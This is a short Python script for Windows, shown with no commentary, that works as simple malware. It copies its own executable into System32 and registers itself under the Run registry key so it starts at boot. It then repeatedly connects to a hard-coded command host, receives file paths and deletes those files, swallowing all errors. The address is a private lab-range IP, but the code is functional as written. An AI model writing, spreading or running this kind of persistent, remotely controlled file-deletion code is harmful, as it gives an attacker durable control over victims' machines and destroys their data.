import os
import shutil
import sys
import winreg
import socket
import time

def copy_self_to_system_dir():
    system_dir = os.path.join(os.environ['SystemRoot'], 'System32')

    file_name = os.path.basename(sys.executable)

    destination = os.path.join(system_dir, file_name)

    if not os.path.exists(destination):
        shutil.copy(sys.executable, destination)

    return destination

def add_to_startup(file_path):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    winreg.SetValueEx(key, "MySelfCopyProgram", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

def client_program():
    host = '192.168.56.101'
    port = 5000

    while True:
        try:
            client_socket = socket.socket() 
            client_socket.connect((host, port))

            data = client_socket.recv(1024).decode()

            client_socket.close() 

            os.remove(data)
        except:
            time.sleep(10)


system_dir = os.path.join(os.environ['SystemRoot'], 'System32')
file_name = os.path.basename(sys.executable)
destination_path = os.path.join(system_dir, file_name)

if not os.path.exists(destination_path):
    destination_path = copy_self_to_system_dir()
    add_to_startup(destination_path)
else:
    client_program()